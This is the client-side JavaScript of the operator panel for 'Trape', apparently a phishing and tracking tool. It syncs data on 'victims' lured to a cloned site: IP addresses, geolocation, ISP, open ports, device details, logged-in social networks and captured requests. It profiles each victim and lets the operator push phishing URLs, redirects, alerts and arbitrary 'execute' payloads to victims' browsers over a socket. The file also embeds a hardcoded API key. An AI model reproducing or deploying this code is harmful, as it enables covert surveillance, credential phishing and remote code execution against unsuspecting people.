$(document).ready(function() {

  namespace = '/trape';
  var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);

  var Trape = {
    self: this,
    name: "Trape",
    out: "",
    key: "abcdefghijklmnopqrstuvwxyz0123456789",
    token: Math.random().toString().substring(7).substr(0,7),
    array: [0,1,2,3,4,5,6,7,8,9],
    log: function(value) {
      // simplification > console.log
      console.log(value);
    },
    deploy: function() {
      Trape.self.showDetails();
      Trape.self.shareSocial();
    }
  };

// unique detail function for attr > Trape
  Trape.self.jsToken = function() {
    var randomToken = function() {
      // helping: http://stackoverflow.com/questions/8532406/create-a-random-token-in-javascript-based-on-user-details
      return Trape.token;
    };
    var generateToken = function() {
      return randomToken();
    }; 
    var random = function(values) {
      return values[Math.floor((Math.random()*values.length))];
    };
    var supportRand = function() {
      for(var val = 0; val < 5; val++)
        Trape.out += Trape.key.charAt(Math.floor(Math.random()*Trape.key.length));
      return Trape.out; 
    }
    var prefixRand = function() {
      return random(Trape.array)  
    };

    var token = Trape.runToken = prefixRand() + supportRand() + generateToken();

    Trape.log("Token" + "-" + Trape.name + ":" + " " + token);

    // running token
    return token; 
  }

  // Running jsToken
  var token = Trape.self.jsToken();

  if (localStorage.trape == null) {
        window.location.replace('/logout');
    } else {
        var id = { 
            id : localStorage.trape
        };

        $.ajax({
            url: '/login',
            data: id,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                if (response.status != 'OK'){
                    //Delete localStorage Variable
                    delete localStorage.trape;
                    //Redirect to the panel
                    window.location.replace('/');
                } else {
                    $.ajax({
                      url: '/get_title',
                      dataType: "json",
                      type: 'POST',
                      complete: function(data) {
                        $('#lblTrape_DomainTitle').text(data.responseJSON.title);
                        $('#lnkTrape_ShareTwitter').attr('href','https://twitter.com/intent/tweet?url=' + 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path +'&text=' + data.responseJSON.title + '&hashtags=FirstYourSecurity&via=boxug');
                        $('#lnkTrape_ShareFacebook').attr('href','https://www.facebook.com/sharer.php?u=' + 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);
                      }   
                    });

                    $('#lnkTrapeControl_DomainClone').text(response.url_to_clone);
                    $('#lnkTrapeControl_DomainClone').attr('href', response.victim_path);
                    $('#lblTrapeControl_StartDate').text(response.date_start);

                    $('#lnkTrapeControl_url').text('http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);
                    $('#lnkTrapeControl_url').attr('href', 'http://' + response.user_ip + ':' + response.app_port + '/' + response.victim_path);

                    socket.emit('join', {room: id.id});
               }
            },
            error: function(error) {
                console.log(error);
            }
        });


        dataSync();
    }

    Trape.self.showDetails = function() {
        // Generate unique box Modal (Detail) safe touch :)
        $(".TrapeControl-ViewDetails").attr("id", "show" + "-" + token);
    };

    Trape.self.shareSocial = function() {
        var menuToggle = $('[data-action="toggle"]');
        var menu = $('.TrapeControl-shareBox');

        menuToggle.click(function() {
            menu.toggleClass("active");
        });

        $(".TrapeControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----buttonShare").click(function(event) {
            event.preventDefault();
            event.stopPropagation();
            $(".TrapeControl-Wrapper--PrincipalData---InfoDetails----zoneCopy-----buttonShare").toggleClass("is-active--up");
        });
    }

    $(document).delegate('[button-trape-detail="show"]', 'click', function(event) {
      event.preventDefault();
      var idVictim = $(this).attr("data-vid");
      window.idVictim = idVictim;
      var behavior = $(this).parent('div').parent('div').find('.TrapeControl-History--Logs---centerData----behavior').text();
         $.ajax({
            url: '/get_preview',
            data: {vId : idVictim},
            dataType: "json",
            type: 'POST',
            success: function(response) {
                if (response.status != 'OK') {

                } else {
                    $(".TrapeControl-ViewDetails").addClass("active");

                    $('.TrapeControl-Preview--box---Sidebar----NetworksStatus').removeClass('online');
                    $('.TrapeControl-Preview--box---Sidebar----NetworksStatus').removeClass('offline');
                    $('.TrapeControl-Preview--box---Sidebar----NetworksStatus').addClass('offline');
                    $('.TrapeControl-Preview--box---Sidebar----NetworksStatus').text('Offline');

                    $.each(response.n, function(index, val) {
                       $('.TrapeControl-Preview--box---Sidebar----NetworksDefine.' + val[3].toLowerCase() + ' span').removeClass('offline');
                       $('.TrapeControl-Preview--box---Sidebar----NetworksDefine.' + val[3].toLowerCase() + ' span').addClass('online');
                       $('.TrapeControl-Preview--box---Sidebar----NetworksDefine.' + val[3].toLowerCase() + ' span').text('Online');
                    });

                    var d = response.d[0];

                    $("#lnkTrapeControlPreview_Map").attr('href', 'http://maps.google.com/maps/place/' + d[15] + ',' + d[16] + '/@' + d[15] + ',' + d[16] + ',10z/data=!3m1!1e3');
                    $('#imgTrapeControlPreview_Map').attr('src', 'https://maps.googleapis.com/maps/api/staticmap?zoom=16&size=437x368&maptype=roadmap&markers=color:red%7Clabel:C%7C' + d[15] +  ',' + d[16] + '&key=AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM');

                    $('#lblTrapeControl_Preview_CPU').text(d[7].charAt(0).toUpperCase() + d[7].slice(1));
                    $('#lblTrapeControl_Preview_SO').text(d[6].charAt(0).toUpperCase() + d[6].slice(1));
                    $('#lblTrapeControl_Preview_Browser').text(d[5].charAt(0).toUpperCase() + d[5].slice(1));
                    $('#lblTrapeControl_Preview_Country').text(d[13]);
                    $('#lblTrapeControl_Preview_City').text(d[19]);
                    $('#lblTrapeControl_Preview_Latitude').text(d[15]);
                    $('#lblTrapeControl_Preview_Longitude').text(d[16]);
                    $('#lblTrapeControl_Preview_OpenPorts').text(d[8]);
                    $('#lblTrapeControl_Preview_ISP').text(d[22]);
                    $('#lblTrapeControl_Preview_UA').text(d[23]);
                    $('#lblTrapeControl_Preview_UA').attr('title', d[23]);

                    $('#lnkTrapeControlPreview_PublicIP').text(d[14]);
                    $('#lnkTrapeControlPreview_LocalIP').text(d[1]);

                    $("#lblTrapeControl_Preview_Behavior").text(behavior);
                }
            },
            error: function(error) {
                console.log(error);
            }
        });
      });

    $(document).delegate(".TrapeControl-Preview--buttonClose", 'click', function(event) {
        $(".TrapeControl-ViewDetails").removeClass("active");
        event.preventDefault();
    });

    // Tabs logs/requests
    $(document).delegate(".TrapeControl-History--Tabs---button", 'click', function(e) {
        e.preventDefault();
        var tabAttr = $(this).data('action');
        var boxPreview = $(".TrapeControl-History--Logs");
        $('.TrapeControl-History--Tabs---button').removeClass('is-active');
        $(this).addClass('is-active');

        if (tabAttr == true) {
          boxPreview.show();
        } else {
          boxPreview.each(function() {
            var reAttr = $(this).data("action");
          if (reAttr == tabAttr) {
              $(this).show();
            } else {
              $(this).hide();
            }
        });
      }
    });

    // Tabs info/attacks
    $(".TrapeControl-Preview--Tabs---button").on('click', function(e) {
        e.preventDefault();
        var tabAttr = $(this).data('action');
        var boxPreview = $(".TrapeControl-BoxTab");
        $('.TrapeControl-Preview--Tabs---button').removeClass('is-active');
        $(this).addClass('is-active');

        if (tabAttr == true) {
          boxPreview.show();
        } else {
          boxPreview.each(function() {
            var reAttr = $(this).data("action");
          if (reAttr == tabAttr) {
              $(this).show();
            } else {
              $(this).hide();
            }
        });
      }
    });

    // run functions
    Trape.deploy();

    socket.on('my_response', function(msg) {
        switch (msg.data){
            case 'update-data':
                dataSync();
                break;
            default:
                return false;
        }
    });

    $(document).delegate('.TrapeControl-Preview--box---Sidebar----NetworksStatus.online', 'click', function(event) {
        var network = $(this).parent('div').attr("class").replace('TrapeControl-Preview--box---Sidebar----NetworksDefine ', '');
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'network', 'message' : network}});
    });

    $('#btnTrapeControl-BoxTab-Phishing').on('click', function(event) {
        event.preventDefault();
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'url', 'message' : $('#txtTrapeControl-BoxTab-Phishing').val()}}); 
    });

    $('#btnTrapeControl-BoxTab-Redirect').on('click', function(event) {
        event.preventDefault();
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'redirect', 'message' : $('#txtTrapeControl-BoxTab-Redirect').val()}}); 
    });

    $('#btnTrapeControl-BoxTab-Alert').on('click', function(event) {
        event.preventDefault();
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'alert', 'message' : $('#txtTrapeControl-BoxTab-Alert').val()}}); 
    });

    $('#btnTrapeControl-BoxTab-Execute').on('click', function(event) {
        event.preventDefault();
        socket.emit('my_room_event', {room: window.idVictim, data: {'type' : 'execute', 'message' : $('#txtTrapeControl-BoxTab-Execute').val()}}); 
    });

    $('.TrapeControl-BoxTab--Form, .TrapeControl-BoxTab--FormRight').on('submit', function(event) {
        event.preventDefault();
        $(this).find('button').trigger('click');
    });
});

/* Here is defined, a behavioral supposition of a user or victim */
var profiling = function(value) {
    var behavior = 'Unknown';
    if (value != undefined) {
        behavior = 'User';
        if (value.indexOf('Facebook') >= 0)   {   
            behavior = 'Common';
        }
        if (value.indexOf('Airbnb') >= 0)   {   
            behavior = 'Traveller';
        }
        if (value.indexOf('Facebook') >= 0 && value.indexOf('Instagram') >= 0)   {   
            behavior = 'Common';
        }
        if (value.indexOf('Facebook') >= 0 && value.indexOf('Instagram') >= 0 && value.indexOf('Twitter') >= 0) {   
            behavior = 'Marketer';  
        }
        if (value.indexOf('Medium') >= 0 || value.indexOf('Reddit') >= 0) {   
            behavior = 'Geek';  
        }
        if (value.indexOf('Bitbucket') >= 0 || value.indexOf('Github') >= 0) {   
            behavior = 'Developer';  
        }
        if (value.indexOf('Airbnb') >= 0 || value.indexOf('Foursquare') >= 0) {   
            behavior = 'Traveller';  
        }
        if (value.indexOf('Slack') >= 0 || value.indexOf('Hackernews') >= 0) {   
            behavior = 'Entrepreneur';  
        }
        if (value.indexOf('Slack') >= 0 && value.indexOf('Hackernews') >= 0 && value.indexOf('Reddit') >= 0) {    
            behavior = 'Entrepreneur';  
        }
        if (value.indexOf('Bitbucket') >= 0 && value.indexOf('Github') >= 0 && value.indexOf('PayPal') >= 0 && value.indexOf('Reddit') >= 0) {   
            behavior = 'Hacker';  
        }
        if (value.indexOf('Medium') >= 0 && value.indexOf('Bitbucket') >= 0 && value.indexOf('Github') >= 0 && value.indexOf('PayPal') >= 0 && value.indexOf('Reddit') >= 0 && value.indexOf('Hackernews') >= 0 && value.indexOf('Airbnb') >= 0 && value.indexOf('Twitter') >= 0 && value.indexOf('Spotify') >= 0) {   
            behavior = 'Tech-lover';  
        }
    }

    return behavior;
} 

var dataSync = function() {
    $.ajax({
            url: '/get_data',
            data: null,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                var htmlData = '';
                var locations = [];
                var chkLocations = 0;
                var tmpId = '';
                var networks = [];
                $.each(response.n, function(index, val) {
                    if (tmpId != val[0]) {
                        networks[val[0]] = [];
                        tmpId = val[0];
                    }

                    networks[val[0]].push(val[3]);
                });

                if (response.d.length > 0) {
                    $.each(response.d, function(index, val) {
                        var userType = profiling(networks[val[0]]);
                        chkLocations = locations.indexOf(val[15]);
                        if (chkLocations < 0) {
                            locations.push(val[15]);
                        }

                        htmlData += '<div class="TrapeControl-History--Logs---log">';

                          if (val[6] == 'android' || val[6] == 'iphone'){
                            htmlData += '<span class="TrapeControl-History--Logs---logDevice----mobile"></span>';
                          } else {
                            htmlData += '<span class="TrapeControl-History--Logs---logDevice----desktop"></span>';
                          }
                          htmlData += '<div class="TrapeControl-History--Logs---logData">';
                            htmlData += '<a class="TrapeControl-History--Logs---logData----victimIP" href="' + val[14] +  '">' + val[14] +  '<span class="TrapeControl-History--Logs---logData----lineVertical"></span><span class="TrapeControl-History--Logs---logData----requests"><span class="TrapeControl-History--Logs---logData----iconRequests"></span>' + val[25] + '</span></a>';
                            htmlData += '<span class="TrapeControl-History--Logs---logData----countryTime"><strong>' + val[13] + '</strong> on ' + val[2] + '</span>';
                          htmlData += '</div>';
                          htmlData += '<div class="TrapeControl-History--Logs---zonePreview">';
                            htmlData += '<div class="TrapeControl-History--Logs---zonePreview----code">' + val[0].substring(0, 5) + '</div> ';
                            htmlData += '<a class="TrapeControl-History--Logs---zonePreview----button" href="#" data-vid="' + val[0] + '" button-trape-detail="show"><span class="icon-database"></span> details</a> ';
                          htmlData += '</div>';
                          htmlData += '<div class="TrapeControl-History--Logs---centerData">';
                            htmlData += '<div class="TrapeControl-History--Logs---centerData----osBrowser">';
                              htmlData += '<p class="TrapeControl-History--Logs---centerData----osBrowser-----browser"><strong><span class="logs-iconDEvice icon-' + val[5].toLowerCase() + '"></span></strong> ' + val[5].charAt(0).toUpperCase() + val[5].slice(1) + ' </p>';
                              htmlData += '<p class="TrapeControl-History--Logs---centerData----osBrowser-----os"><strong><span class="logs-iconDEvice icon-' + val[6] + '"></span></strong> ' + val[6] + '</p>';
                            htmlData += '</div>';
                            htmlData += '<span class="TrapeControl-History--Logs---centerData----behavior">' + userType + '</span>';
                          htmlData += '</div>';
                        htmlData += '</div>';
                    });

                } else {
                    htmlData += '<div class="TrapeControl-HistoryRequests--NotData">';
                      htmlData += 'There are no victims available, he shares the lure.';
                    htmlData += '</div>';
                }

                $('#cntTrapeControl_Logs div').remove();
                $('#cntTrapeControl_Logs').prepend(htmlData);

                $("#lblTrapeControl_Stats_Victims").text(response.d.length);
                $('#lblTrapeControl_Stats_Locations').text(locations.length);

                $('#lblTrapeControl_Stats_Clicks').text(response.c);
                $('#lblTrapeControl_Stats_Sessions').text(response.s);
                $('#lblTrapeControl_Stats_Online').text(response.o);
            },
            error: function(error) {
                console.log(error);
                setTimeout(function() {
                    dataSync(); 
                }, 3000);
            }
        });

        $.ajax({
            url: '/get_requests',
            data: null,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                var htmlData = "";
                var requests = 0;

                var tmpId = "";
                var tmpTarget = [];

                $.each(response.d, function(index, val) {
                    if (tmpId != val[0]) {
                        tmpId = val[0];
                        requests++;
                        if (htmlData != '') {
                            htmlData += '</ul></div></div></div><!-- -->';
                        }

                        tmpTarget = val[2].split('/');
                        tmpTarget = tmpTarget[0] + '//' + tmpTarget[2];

                        htmlData += '<!-- -->';
                        htmlData += '<div class="TrapeControl-Requests">';
                          htmlData += '<div class="TrapeControl-Requests--HeaderData">';
                            htmlData += '<div class="TrapeControl-Requests--HeaderData---define">';
                              htmlData += '<div class="TrapeControl-Requests--HeaderData---idRequest">' + val[1] + '</div>';
                              htmlData += '<!--<div class="TrapeControl-Requests--HeaderData---define----value">Endpoint: <strong>localhost:8080</strong></div> -->';
                              htmlData += '<div class="TrapeControl-Requests--HeaderData---define----value">IP victim: <strong>' + val[7] +  '</strong></div>';
                              htmlData += '<div class="TrapeControl-Requests--HeaderData---define----value">Target: <strong>' + tmpTarget + '</strong></div>';
                              htmlData += '<div class="TrapeControl-Requests--HeaderData---define----value">Date: <strong>' + val[6] + '</strong></div>';
                            htmlData += '</div>';
                          htmlData += '</div>';
                          htmlData += '<div class="TrapeControl-Requests--body">';
                            htmlData += '<div class="TrapeControl-Requests--body---Data">';
                              htmlData += '<ul>';
                    }

                            htmlData += '<div class="TrapeControl-Requests--body---Data----view"><strong>' + (val[3] || val[4]) + ':</strong> ' + val[5] + '</div>';
                });
                if (htmlData != '') {
                    htmlData += '</ul></div></div></div><!-- -->';
                } else{
                    htmlData += '<div class="TrapeControl-HistoryRequests--NotData">';
                      htmlData += 'No victim requests yet';
                    htmlData += '</div>';
                }

                $('#cntTrapeControl_Requests div').remove();
                $('#cntTrapeControl_Requests').append(htmlData);

                $('#lblTrapeControl_Stats_Requests').text(requests);
                setTimeout(function(){ dataSync(); }, 50000);
            },
            error: function(error) {
                console.log(error);
                setTimeout(function(){ dataSync(); }, 3000);
            }
        });
}